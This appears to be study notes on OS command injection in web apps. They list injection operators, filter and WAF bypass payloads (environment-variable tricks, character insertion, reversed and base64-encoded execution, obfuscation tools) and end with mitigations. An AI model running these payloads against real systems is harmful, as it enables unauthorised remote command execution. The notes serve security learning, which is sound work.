# Command Injections
## 🎯 Main Idea
- Exploit web apps that pass unsanitized user input into OS command execution functions.
- Goal: inject and execute arbitrary system commands on the back-end server (RCE).
- Covers detection, injection operators, and bypassing character/command filters & WAFs.
- Applies regardless of language/framework (PHP, NodeJS, .NET) or OS (Linux/Windows).

## 💥 Attack / Exploit Vectors

### Detection
- Find input used in a system command (e.g. `ping -c 1 OUR_INPUT`); append a command and watch output change.
- Vulnerable functions: PHP `exec/system/shell_exec/passthru/popen`, NodeJS `child_process.exec/spawn`.

### Injection Operators
- Append a second command using shell operators; front-end validation is bypassed via Burp/ZAP + URL-encode (`[CTRL+U]`).
- **Commands**
  - `;` (`%3b`) — semicolon, both run (not in Windows CMD)
  - `\n` (`%0a`) — new line, both run (often not blacklisted)
  - `&` (`%26`) — background, both run
  - `|` (`%7c`) — pipe, only second output shown
  - `&&` (`%26%26`) — AND, second runs only if first succeeds
  - `||` (`%7c%7c`) — OR, second runs only if first fails
  - `` `` `` (`%60%60`) — sub-shell (Linux only)
  - `$()` (`%24%28%29`) — sub-shell (Linux only)
  - `127.0.0.1; whoami` — example payload

### Identifying Filters
- Reduce payload one character at a time to find what triggers "Invalid input".
- App-level block (inline error) vs WAF block (different page w/ IP/request details).

### Bypassing Space Filters
- **Commands**
  - `%09` — tab instead of space
  - `${IFS}` — Linux env var = space/tab (not usable inside `$()`)
  - `{ls,-la}` — Bash brace expansion (commas become spaces)

### Bypassing Blacklisted Characters (Linux)
- Produce needed chars from env-var substrings without typing them.
- **Commands**
  - `${PATH:0:1}` — yields `/`
  - `${LS_COLORS:10:1}` — yields `;`
  - `printenv` — list env vars to find useful characters
  - `$(tr '!-}' '"-~'<<<[)` — character shift (`[` → `\`), use `man ascii` to pick char

### Bypassing Blacklisted Characters (Windows)
- **Commands**
  - `%HOMEPATH:~6,-11%` — yields `\` (CMD)
  - `$env:HOMEPATH[0]` — yields `\` (PowerShell)
  - `%PROGRAMFILES:~10,-5%` — yields space (CMD)
  - `$env:PROGRAMFILES[10]` — yields space (PowerShell)
  - `Get-ChildItem Env:` — list env vars (PowerShell)

### Bypassing Blacklisted Commands (Character Insertion)
- Insert shell-ignored chars into command words to evade exact-match blacklist.
- **Commands**
  - `w'h'o'am'i` / `w"h"o"am"i` — quotes (even count, don't mix); Linux & Windows
  - `who$@ami` — positional param `$@` (Linux only, any count)
  - `w\ho\am\i` — backslash (Linux only)
  - `who^ami` — caret `^` (Windows CMD only)

### Advanced Obfuscation — Case Manipulation
- **Commands**
  - `WhOaMi` — Windows case-insensitive, send as-is
  - `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` — force lowercase on Linux
  - `$(a="WhOaMi";printf %s "${a,,}")` — variant lowercase technique

### Advanced Obfuscation — Reversed Commands
- **Commands**
  - `echo 'whoami' | rev` — reverse string (Linux)
  - `$(rev<<<'imaohw')` — execute reversed (Linux)
  - `"whoami"[-1..-20] -join ''` — reverse string (Windows)
  - `iex "$('imaohw'[-1..-20] -join '')"` — execute reversed (Windows)

### Advanced Obfuscation — Encoded Commands
- Encode payload (avoids filtered chars / URL-decode issues), decode & exec in sub-shell.
- **Commands**
  - `echo -n 'cat /etc/passwd | grep 33' | base64` — base64 encode (Linux)
  - `bash<<<$(base64 -d<<<Y2F0...Mw==)` — decode & exec (uses `<<<` to avoid pipe)
  - `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` — encode (Windows)
  - `echo -n whoami | iconv -f utf-8 -t utf-16le | base64` — utf-16 encode on Linux for Windows
  - `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` — decode & exec (Windows)

### Evasion Tools
- Automated obfuscation when manual bypasses fail against WAFs.
- **Commands**
  - `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1` — Linux Bashfuscator (short output)
  - `Import-Module .\Invoke-DOSfuscation.psd1; Invoke-DOSfuscation` — Windows DOSfuscation (interactive; BINARY/ENCODING/PAYLOAD)

## 🛠️ Key Tools & Concepts
- Burp Suite / ZAP — intercept & modify requests to bypass front-end validation
- Firefox Dev Tools (`[CTRL+SHIFT+E]`) — confirm validation is front-end only
- Bashfuscator (Linux) / Invoke-DOSfuscation (Windows) — automated obfuscation
- PayloadsAllTheThings — command injection bypass references
- Injection types overview: SQL, LDAP, XPath, Code, Header, etc.

## 🛡️ Mitigations
- Avoid system-command functions; use built-in equivalents (e.g. PHP `fsockopen` to check a host).
- Validate input on front-end AND back-end (`filter_var` w/ `FILTER_VALIDATE_IP`, regex `preg_match`, is-ip).
- Sanitize input: whitelist allowed chars with `preg_replace('/[^A-Za-z0-9.]/','',...)`, DOMPurify; escaping (escapeshellcmd) is weak/bypassable.
- Server config: mod_security + external WAF, run as low-priv user (www-data), PHP `disable_functions`, `open_basedir`, reject double-encoded/non-ASCII, avoid outdated modules (PHP CGI).
